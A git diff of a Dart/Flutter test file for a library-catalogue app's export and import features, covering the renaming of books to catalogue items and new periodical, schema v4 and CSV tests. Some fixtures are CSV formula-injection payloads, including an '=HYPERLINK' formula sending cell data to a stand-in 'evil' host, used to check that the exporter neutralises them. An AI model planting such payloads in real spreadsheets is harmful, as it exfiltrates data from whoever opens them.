@@ -1,9 +1,11 @@
 import 'dart:convert';
 import 'dart:typed_data';
 
+import 'package:drift/native.dart';
 import 'package:flutter/services.dart' show rootBundle;
 import 'package:flutter_test/flutter_test.dart';
 import 'package:fpdart/fpdart.dart';
+import 'package:pitaka/core/database/app_database.dart';
 import 'package:pitaka/core/error/failure.dart';
 import 'package:pitaka/features/import_export/application/export_library_use_case.dart';
 import 'package:pitaka/features/import_export/domain/export_source_filter.dart';
@@ -14,38 +16,55 @@ import 'package:pitaka/features/import_export/domain/pdf_text_raster.dart';
 import 'package:pitaka/features/import_export/infrastructure/pdf_library_renderer.dart';
 import 'package:pitaka/features/import_export/infrastructure/pitaka_json_exporter.dart';
 import 'package:pitaka/features/import_export/infrastructure/pitaka_json_importer.dart';
-import 'package:pitaka/features/library/domain/book_page.dart';
-import 'package:pitaka/features/library/domain/entities/book.dart';
+import 'package:pitaka/features/library/domain/catalogue_item_page.dart';
+import 'package:pitaka/features/library/domain/entities/catalogue_item.dart';
 import 'package:pitaka/features/library/domain/library_query.dart';
-import 'package:pitaka/features/library/domain/repositories/book_repository.dart';
+import 'package:pitaka/features/library/domain/repositories/catalogue_item_repository.dart';
+import 'package:pitaka/features/library/domain/value_objects/item_details.dart';
+import 'package:pitaka/features/library/domain/value_objects/item_kind.dart';
+import 'package:pitaka/features/library/infrastructure/drift_catalogue_item_repository.dart';
+import 'package:pitaka/features/periodicals/domain/entities/periodical.dart';
+import 'package:pitaka/features/periodicals/domain/value_objects/periodical_frequency.dart';
 import 'package:pitaka/features/wishlist/domain/entities/wishlist_book.dart';
 import 'package:pitaka/features/wishlist/domain/repositories/wishlist_repository.dart';
 
-class _Books implements BookRepository {
+import '../../support/raw_catalogue_rows.dart';
+import '../periodicals/application/periodical_fakes.dart';
+import 'bundle_test_fixture.dart';
+import 's11_interchange_roundtrip_fixture.dart';
+
+class _Books implements CatalogueItemRepository {
   _Books(this._all);
 
-  // BookRepository additions (review 2026-09-03): fakes default to "no match"
-  // and a pass-through transaction unless a test overrides them.
+  // CatalogueItemRepository additions (review 2026-09-03): fakes default to "no
+  // match" and a pass-through transaction unless a test overrides them.
   @override
-  Future<Either<Failure, Book?>> findByUid(String bookUid) async => right(null);
+  Future<Either<Failure, CatalogueItem?>> findByUid(String itemUid) async =>
+      right(null);
   @override
   Future<Either<Failure, T>> runInTransaction<T>(
     Future<Either<Failure, T>> Function() action,
   ) => action();
-  final List<Book> _all;
+  final List<CatalogueItem> _all;
   @override
-  Future<Either<Failure, List<Book>>> getAll() async => right(_all);
+  Future<Either<Failure, List<CatalogueItem>>> getAll() async => right(_all);
   @override
-  Future<Either<Failure, BookPage>> page(
+  Future<Either<Failure, List<CatalogueItem>>> getAllForInterchange() async =>
+      right(_all);
+  @override
+  Future<Either<Failure, CatalogueItemPage>> page(
     LibraryQuery query, {
     required int limit,
     int offset = 0,
   }) async {
-    final rows = query.isSearch ? const <Book>[] : _all;
+    final rows = query.isSearch ? const <CatalogueItem>[] : _all;
     final start = offset.clamp(0, rows.length);
     final end = (start + limit).clamp(start, rows.length);
     return right(
-      BookPage(items: rows.sublist(start, end), hasMore: end < rows.length),
+      CatalogueItemPage(
+        items: rows.sublist(start, end),
+        hasMore: end < rows.length,
+      ),
     );
   }
 
@@ -54,16 +73,19 @@ class _Books implements BookRepository {
       right(const []);
   @override
   Future<Either<Failure, List<String>>> distinctSourceDetails(
-    BookSourceType type,
+    ItemSourceType type,
   ) async => right(const []);
   @override
-  Future<Either<Failure, Book?>> getById(int id) async => right(null);
+  Future<Either<Failure, CatalogueItem?>> getById(int id) async => right(null);
   @override
-  Future<Either<Failure, Book?>> findByIsbn(String isbn) async => right(null);
+  Future<Either<Failure, CatalogueItem?>> findByIsbn(String isbn) async =>
+      right(null);
   @override
-  Future<Either<Failure, Book>> insert(Book b) async => right(b);
+  Future<Either<Failure, CatalogueItem>> insert(CatalogueItem b) async =>
+      right(b);
   @override
-  Future<Either<Failure, Book>> update(Book b) async => right(b);
+  Future<Either<Failure, CatalogueItem>> update(CatalogueItem b) async =>
+      right(b);
   @override
   Future<Either<Failure, Unit>> markRemoved(int id, int at) async =>
       right(unit);
@@ -73,9 +95,10 @@ class _Books implements BookRepository {
   @override
   Future<Either<Failure, Unit>> delete(int id) async => right(unit);
   @override
-  Future<Either<Failure, int>> insertAll(List<Book> b) async => right(b.length);
+  Future<Either<Failure, int>> insertAll(List<CatalogueItem> b) async =>
+      right(b.length);
   @override
-  Future<Either<Failure, int>> replaceAll(List<Book> b) async =>
+  Future<Either<Failure, int>> replaceAll(List<CatalogueItem> b) async =>
       right(b.length);
 }
 
@@ -83,13 +106,13 @@ class _Books implements BookRepository {
 /// rows and the subtitle) instead of rendering, so the filter tests check
 /// the contract without parsing PDF bytes.
 class _RecordingRenderer implements LibraryPdfRenderer {
-  List<Book> books = const [];
+  List<CatalogueItem> books = const [];
   String? subtitle;
 
   @override
   Future<Uint8List> render({
     required String libraryName,
-    required List<Book> books,
+    required List<CatalogueItem> books,
     required List<PrintColumn> columns,
     required String footerAttribution,
     String? subtitle,
@@ -139,12 +162,12 @@ void main() {
   TestWidgetsFlutterBinding.ensureInitialized();
 
   const books = [
-    Book(
+    CatalogueItem(
       title: 'भारत: गांधी के बाद',
       author: 'Ramachandra Guha',
       isbn: '978-1',
       ageGroup: AgeGroup.advanced,
-      sourceType: BookSourceType.gift,
+      sourceType: ItemSourceType.gift,
       language: 'Hindi',
       copyCount: 3,
       addedDate: 100,
@@ -152,7 +175,7 @@ void main() {
       removedAt: 200,
       addedBy: 'Khoj',
     ),
-    Book(title: 'Plain', addedDate: 50),
+    CatalogueItem(title: 'Plain', addedDate: 50),
   ];
   const wishlist = [
     WishlistBook(
@@ -171,6 +194,7 @@ void main() {
       pdfRenderer: const PdfLibraryRenderer(),
       bookRepo: _Books(books),
       wishlistRepo: _Wishlist(wishlist),
+      periodicalRepo: FakePeriodicals(),
     );
     final result = await useCase(
       scope: ExportScope.both,
@@ -182,14 +206,14 @@ void main() {
 
     final payload = const PitakaJsonImporter().parse(utf8.decode(export.bytes));
     expect(payload.parseErrors, isEmpty);
-    expect(payload.books.length, 2);
+    expect(payload.items.length, 2);
     expect(payload.wishlist.length, 1);
 
-    final b = payload.books.firstWhere((x) => x.isbn == '978-1');
+    final b = payload.items.firstWhere((x) => x.isbn == '978-1');
     expect(b.title, 'भारत: गांधी के बाद');
     expect(b.author, 'Ramachandra Guha');
     expect(b.ageGroup, AgeGroup.advanced);
-    expect(b.sourceType, BookSourceType.gift);
+    expect(b.sourceType, ItemSourceType.gift);
     expect(b.language, 'Hindi');
     expect(b.copyCount, 3);
     expect(b.removed, isTrue);
@@ -208,6 +232,7 @@ void main() {
       pdfRenderer: const PdfLibraryRenderer(),
       bookRepo: _Books(books),
       wishlistRepo: _Wishlist(wishlist),
+      periodicalRepo: FakePeriodicals(),
     );
     final result = await useCase(
       scope: ExportScope.libraryOnly,
@@ -215,7 +240,7 @@ void main() {
     );
     final export = result.getOrElse((f) => fail('failed: $f'));
     final payload = const PitakaJsonImporter().parse(utf8.decode(export.bytes));
-    expect(payload.books.length, 2);
+    expect(payload.items.length, 2);
     expect(payload.wishlist, isEmpty);
   });
 
@@ -225,6 +250,7 @@ void main() {
       pdfRenderer: const PdfLibraryRenderer(),
       bookRepo: _Books(books),
       wishlistRepo: _Wishlist(wishlist),
+      periodicalRepo: FakePeriodicals(),
     );
     final result = await useCase(
       scope: ExportScope.libraryOnly,
@@ -242,23 +268,24 @@ void main() {
   // export as a bare formula cell that Excel/LibreOffice would execute.
   test('CSV export neutralises formula-leading cells (OWASP)', () async {
     const hostile = [
-      Book(title: '=1+1', addedDate: 1),
-      Book(title: '+cmd', addedDate: 2),
-      Book(title: '-2+3', addedDate: 3),
-      Book(title: '@SUM(A1)', addedDate: 4),
-      Book(title: '\ttabbed', addedDate: 5),
-      Book(
+      CatalogueItem(title: '=1+1', addedDate: 1),
+      CatalogueItem(title: '+cmd', addedDate: 2),
+      CatalogueItem(title: '-2+3', addedDate: 3),
+      CatalogueItem(title: '@SUM(A1)', addedDate: 4),
+      CatalogueItem(title: '\ttabbed', addedDate: 5),
+      CatalogueItem(
         title: '=HYPERLINK("http://evil/?"&A1),x',
         notes: 'safe',
         addedDate: 6,
       ),
-      Book(title: 'Normal title', addedDate: 7),
+      CatalogueItem(title: 'Normal title', addedDate: 7),
     ];
     final useCase = ExportLibraryUseCase(
       jsonEncoder: const PitakaJsonExporter(),
       pdfRenderer: const PdfLibraryRenderer(),
       bookRepo: _Books(hostile),
       wishlistRepo: _Wishlist(const []),
+      periodicalRepo: FakePeriodicals(),
     );
     final result = await useCase(
       scope: ExportScope.libraryOnly,
@@ -287,6 +314,7 @@ void main() {
       pdfRenderer: const PdfLibraryRenderer(),
       bookRepo: _Books(books),
       wishlistRepo: _Wishlist(wishlist),
+      periodicalRepo: FakePeriodicals(),
     );
     final result = await useCase(
       // Scope is ignored for PDF (always the library list); pass wishlistOnly
@@ -317,6 +345,7 @@ void main() {
       pdfRenderer: const PdfLibraryRenderer(),
       bookRepo: _Books(books),
       wishlistRepo: _Wishlist(wishlist),
+      periodicalRepo: FakePeriodicals(),
     );
     // Use the bundled app icon as a stand-in library logo (real PNG bytes the
     // renderer can decode). The header should draw it without erroring.
@@ -343,44 +372,45 @@ void main() {
 
   group('source filter (CSV + PDF only)', () {
     const sourced = [
-      Book(
+      CatalogueItem(
         title: 'Godaan',
-        sourceType: BookSourceType.donated,
+        sourceType: ItemSourceType.donated,
         sourceDetail: 'Ram Sharma',
         addedDate: 4,
       ),
-      Book(
+      CatalogueItem(
         title: 'Nirmala',
-        sourceType: BookSourceType.donated,
+        sourceType: ItemSourceType.donated,
         sourceDetail: 'ram sharma',
         addedDate: 3,
       ),
-      Book(
+      CatalogueItem(
         title: 'Gaban',
-        sourceType: BookSourceType.donated,
+        sourceType: ItemSourceType.donated,
         sourceDetail: 'Sita Devi',
         addedDate: 2,
       ),
-      Book(
+      CatalogueItem(
         title: 'Karmabhoomi',
-        sourceType: BookSourceType.purchased,
+        sourceType: ItemSourceType.purchased,
         sourceDetail: 'Ram Sharma',
         addedDate: 1,
       ),
-      Book(title: 'Sevasadan'),
+      CatalogueItem(title: 'Sevasadan'),
     ];
     final useCase = ExportLibraryUseCase(
       jsonEncoder: const PitakaJsonExporter(),
       pdfRenderer: const PdfLibraryRenderer(),
       bookRepo: _Books(sourced),
       wishlistRepo: _Wishlist(const []),
+      periodicalRepo: FakePeriodicals(),
     );
 
     test('CSV by type keeps only that type and tags the file name', () async {
       final result = await useCase(
         scope: ExportScope.libraryOnly,
         format: ExportFormat.csv,
-        sourceFilter: ExportSourceFilter.byType(BookSourceType.donated),
+        sourceFilter: ExportSourceFilter.byType(ItemSourceType.donated),
         now: DateTime(2026, 10, 15).millisecondsSinceEpoch,
       );
       final export = result.getOrElse((f) => fail('failed: $f'));
@@ -399,7 +429,7 @@ void main() {
         scope: ExportScope.libraryOnly,
         format: ExportFormat.csv,
         sourceFilter: ExportSourceFilter.byType(
-          BookSourceType.donated,
+          ItemSourceType.donated,
           detail: 'Ram Sharma',
         ),
         now: DateTime(2026, 10, 15).millisecondsSinceEpoch,
@@ -424,12 +454,13 @@ void main() {
         pdfRenderer: renderer,
         bookRepo: _Books(sourced),
         wishlistRepo: _Wishlist(const []),
+        periodicalRepo: FakePeriodicals(),
       );
       final result = await pdfUseCase(
         scope: ExportScope.libraryOnly,
         format: ExportFormat.pdf,
         sourceFilter: ExportSourceFilter.byType(
-          BookSourceType.donated,
+          ItemSourceType.donated,
           detail: 'Sita Devi',
         ),
         now: DateTime(2026, 10, 15).millisecondsSinceEpoch,
@@ -447,6 +478,7 @@ void main() {
         pdfRenderer: renderer,
         bookRepo: _Books(sourced),
         wishlistRepo: _Wishlist(const []),
+        periodicalRepo: FakePeriodicals(),
       );
       final result = await pdfUseCase(
         scope: ExportScope.libraryOnly,
@@ -467,19 +499,20 @@ void main() {
           jsonEncoder: const PitakaJsonExporter(),
           pdfRenderer: renderer,
           bookRepo: _Books(const [
-            Book(
+            CatalogueItem(
               title: 'गोदान',
-              sourceType: BookSourceType.gift,
+              sourceType: ItemSourceType.gift,
               sourceDetail: 'राम शर्मा',
             ),
           ]),
           wishlistRepo: _Wishlist(const []),
+          periodicalRepo: FakePeriodicals(),
         );
         final result = await pdfUseCase(
           scope: ExportScope.libraryOnly,
           format: ExportFormat.pdf,
           sourceFilter: ExportSourceFilter.byType(
-            BookSourceType.gift,
+            ItemSourceType.gift,
             detail: 'राम शर्मा',
           ),
           now: DateTime(2026, 10, 15).millisecondsSinceEpoch,
@@ -497,34 +530,39 @@ void main() {
         final result = await useCase(
           scope: ExportScope.libraryOnly,
           format: ExportFormat.json,
-          sourceFilter: ExportSourceFilter.byType(BookSourceType.donated),
+          sourceFilter: ExportSourceFilter.byType(ItemSourceType.donated),
         );
         final export = result.getOrElse((f) => fail('failed: $f'));
         expect(export.suggestedFileName, endsWith('.json'));
         final payload = const PitakaJsonImporter().parse(
           utf8.decode(export.bytes),
         );
-        expect(payload.books, hasLength(5));
+        expect(payload.items, hasLength(5));
       },
     );
   });
 
   test('exporter omits null fields but keeps required ones', () {
     final json = const PitakaJsonExporter().export(
-      books: const [Book(title: 'Only')],
+      books: const [CatalogueItem(title: 'Only')],
       wishlist: const [],
+      periodicals: const [],
       exportedAt: 1,
     );
     expect(json, contains('"title": "Only"'));
     expect(json, isNot(contains('"author"')));
-    expect(json, contains('"schemaVersion": 3'));
+    expect(json, contains('"schemaVersion": 4'));
+    // W1: the kind is written explicitly; an empty periodicals list is omitted.
+    expect(json, contains('"kind": "book"'));
+    expect(json, isNot(contains('"periodicals"')));
   });
 
   test('exporter emits libraryId/libraryName the importer reads back', () {
     const exporter = PitakaJsonExporter();
     final json = exporter.export(
-      books: const [Book(title: 'B')],
+      books: const [CatalogueItem(title: 'B')],
       wishlist: const [],
+      periodicals: const [],
       exportedAt: 1,
       libraryId: 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa',
       libraryName: 'Riverside',
@@ -536,11 +574,268 @@ void main() {
 
   test('exporter omits blank libraryId/libraryName from the envelope', () {
     final json = const PitakaJsonExporter().export(
-      books: const [Book(title: 'B')],
+      books: const [CatalogueItem(title: 'B')],
       wishlist: const [],
+      periodicals: const [],
       exportedAt: 1,
     );
     expect(json, isNot(contains('"libraryId"')));
     expect(json, isNot(contains('"libraryName"')));
+  });
+
+  group('schema v4 (ADR 0014 W1)', () {
+    /// A series, one plain book, one other and one of its issues — the full
+    /// kind census of a v4 document.
+    const series = Periodical(
+      id: 1,
+      periodicalUid: 'per-1',
+      title: 'Frontline',
+      issn: '1234-5679',
+      publisher: 'THG',
+      language: 'English',
+      frequency: PeriodicalFrequency.monthly,
+      subscriptionStart: 1735689600000,
+      subscriptionEnd: 1735776000000,
+      addedDate: 50,
+    );
+    const items = [
+      CatalogueItem(itemUid: 'b1', title: 'Plain', addedDate: 10),
+      CatalogueItem(
+        itemUid: 'o1',
+        title: 'Carrom board',
+        notes: 'family set',
+        addedDate: 20,
+        details: OtherItemOf(),
+      ),
+      CatalogueItem(
+        itemUid: 'i1',
+        title: 'Frontline — No 5',
+        publisher: 'THG',
+        addedDate: 30,
+        details: IssueOf(
+          periodicalUid: 'per-1',
+          issueNumber: 5,
+          issueDate: 1759276800000,
+          label: 'Festive number',
+        ),
+      ),
+    ];
+
+    ExportLibraryUseCase useCaseWith({List<CatalogueItem> rows = items}) =>
+        ExportLibraryUseCase(
+          jsonEncoder: const PitakaJsonExporter(),
+          pdfRenderer: const PdfLibraryRenderer(),
+          bookRepo: _Books(rows),
+          wishlistRepo: _Wishlist(const []),
+          periodicalRepo: FakePeriodicals()..seed(series),
+        );
+
+    test('JSON round-trips all three kinds and the periodicals list', () async {
+      final result = await useCaseWith()(
+        scope: ExportScope.libraryOnly,
+        format: ExportFormat.json,
+        now: 999,
+      );
+      final export = result.getOrElse((f) => fail('export failed: $f'));
+      final payload = const PitakaJsonImporter().parse(
+        utf8.decode(export.bytes),
+      );
+      expect(payload.parseErrors, isEmpty);
+
+      final p = payload.periodicals.single;
+      expect(p.title, 'Frontline');
+      expect(p.periodicalUid, 'per-1');
+      expect(p.issn, '1234-5679');
+      expect(p.frequency, PeriodicalFrequency.monthly);
+      expect(p.subscriptionEnd, 1735776000000);
+
+      expect(payload.items, hasLength(3));
+      final book = payload.items.firstWhere((b) => b.itemUid == 'b1');
+      expect(book.kind, ItemKind.book);
+      expect(book.details, isNull);
+      final other = payload.items.firstWhere((b) => b.itemUid == 'o1');
+      expect(other.kind, ItemKind.other);
+      expect(other.details, isA<OtherItemOf>());
+      expect(other.notes, 'family set');
+      final issue = payload.items.firstWhere((b) => b.itemUid == 'i1');
+      expect(issue.kind, ItemKind.magazineIssue);
+      expect(
+        issue.details,
+        isA<IssueOf>()
+            .having((d) => d.periodicalUid, 'periodicalUid', 'per-1')
+            .having((d) => d.issueNumber, 'issueNumber', 5)
+            .having((d) => d.issueDate, 'issueDate', 1759276800000)
+            .having((d) => d.label, 'label', 'Festive number'),
+      );
+      // The projected base fields ride along as plain columns (D3).
+      expect(issue.title, 'Frontline — No 5');
+      expect(issue.publisher, 'THG');
+    });
+
+    test('CSV gains the kind columns and resolves the series title', () async {
+      final result = await useCaseWith()(
+        scope: ExportScope.libraryOnly,
+        format: ExportFormat.csv,
+        now: 999,
+      );
+      final export = result.getOrElse((f) => fail('failed: $f'));
+      final lines = utf8.decode(export.bytes).trim().split('\n');
+      expect(
+        lines.first,
+        endsWith(
+          ',Kind,Series,Volume,Issue,Issue date,Bound until,Issue label',
+        ),
+        reason: 'the classic columns keep their positions',
+      );
+      expect(lines, hasLength(4)); // header + 3 rows
+
+      final bookRow = lines[1].split(',');
+      expect(
+        bookRow.sublist(11),
+        ['Book', '', '', '', '', '', ''],
+        reason: 'a book row leaves the kind columns blank after Kind',
+      );
+
+      final issueRow = lines[3].split(',');
+      expect(issueRow[11], 'Magazine issue');
+      expect(issueRow[12], 'Frontline', reason: 'series title by uid');
+      expect(issueRow[14], '5');
+      expect(issueRow[15], '2025-10-01');
+      expect(issueRow[16], '', reason: 'not a bound volume');
+      expect(issueRow[17], 'Festive number');
+
+      final otherRow = lines[2].split(',');
+      expect(otherRow[11], 'Other');
+    });
+
+    test('export refuses unknown and detail-less stored kinds', () async {
+      for (final rawKind in ['hologram', 'magazine-issue']) {
+        final db = AppDatabase(NativeDatabase.memory());
+        try {
+          await seedRawCatalogueRow(
+            db,
+            title: 'raw $rawKind',
+            kind: rawKind,
+            coverUrl: 'covers/raw.jpg',
+          );
+          final useCase = ExportLibraryUseCase(
+            jsonEncoder: const PitakaJsonExporter(),
+            pdfRenderer: const PdfLibraryRenderer(),
+            bookRepo: DriftCatalogueItemRepository(db),
+            wishlistRepo: _Wishlist(const []),
+            periodicalRepo: FakePeriodicals(),
+          );
+          final result = await useCase(
+            scope: ExportScope.libraryOnly,
+            format: ExportFormat.json,
+          );
+          final failure = result.getLeft().toNullable();
+          if (rawKind == 'hologram') {
+            expect(failure, isA<UnsupportedItemKindFailure>());
+          } else {
+            expect(failure, isA<StorageFailure>());
+          }
+        } finally {
+          await db.close();
+        }
+      }
+    });
+
+    test('a hostile series title is quote-prefixed in CSV (OWASP)', () async {
+      final hostile = FakePeriodicals()
+        ..seed(const Periodical(title: '=EVIL()', periodicalUid: 'per-1'));
+      final useCase = ExportLibraryUseCase(
+        jsonEncoder: const PitakaJsonExporter(),
+        pdfRenderer: const PdfLibraryRenderer(),
+        bookRepo: _Books(const [
+          CatalogueItem(
+            title: 'Safe title',
+            details: IssueOf(periodicalUid: 'per-1', issueNumber: 1),
+          ),
+        ]),
+        wishlistRepo: _Wishlist(const []),
+        periodicalRepo: hostile,
+      );
+      final result = await useCase(
+        scope: ExportScope.libraryOnly,
+        format: ExportFormat.csv,
+      );
+      final export = result.getOrElse((f) => fail('failed: $f'));
+      final row = utf8.decode(export.bytes).trim().split('\n')[1];
+      expect(
+        row.split(',')[12],
+        startsWith("'"),
+        reason: 'the series cell must never open as a formula: $row',
+      );
+    });
+  });
+
+  group('S11 interchange evidence', () {
+    test('v3 JSON imports books and removed state into real Drift', () async {
+      final fixture = BundleTestFixture();
+      addTearDown(fixture.dispose);
+
+      final summary = await importS11Json(
+        fixture,
+        jsonEncode({
+          'schemaVersion': 3,
+          'exportedAt': 1,
+          'books': [
+            {
+              'bookUid': 'v3-active',
+              'title': 'Legacy active book',
+              'author': 'Legacy Author',
+              'addedDate': 10,
+            },
+            {
+              'bookUid': 'v3-removed',
+              'title': 'Legacy removed book',
+              'addedDate': 20,
+              'removed': true,
+              'removedAt': 21,
+            },
+          ],
+          'wishlist': <dynamic>[],
+        }),
+      );
+      expect(summary.parseErrors, isEmpty);
+      expect(summary.booksAdded, 2);
+
+      final items = (await fixture.books.getAll()).getOrElse(
+        (failure) => fail('item read failed: $failure'),
+      );
+      final byUid = {for (final item in items) item.itemUid!: item};
+      expect(byUid, hasLength(2));
+      expect(byUid['v3-active']!.kind, ItemKind.book);
+      expect(byUid['v3-active']!.details, isNull);
+      expect(byUid['v3-active']!.author, 'Legacy Author');
+      expect(byUid['v3-active']!.removed, isFalse);
+      expect(byUid['v3-removed']!.kind, ItemKind.book);
+      expect(byUid['v3-removed']!.removed, isTrue);
+      expect(byUid['v3-removed']!.removedAt, 21);
+    });
+
+    test('v4 JSON round-trips the complete periodical matrix', () async {
+      final source = BundleTestFixture();
+      final target = BundleTestFixture();
+      addTearDown(source.dispose);
+      addTearDown(target.dispose);
+      await seedS11InterchangeSource(source);
+
+      final exported = await exportS11InterchangeJson(source);
+      expect(
+        (jsonDecode(exported) as Map<String, dynamic>)['schemaVersion'],
+        4,
+      );
+      final summary = await importS11Json(
+        target,
+        padS11LegacyIdentities(exported),
+      );
+      expect(summary.parseErrors, isEmpty);
+      expect(summary.periodicalsAdded, 2);
+      expect(summary.booksAdded, 4);
+
+      await expectS11InterchangeState(target, localCoverPreserved: false);
+    });
   });
 }
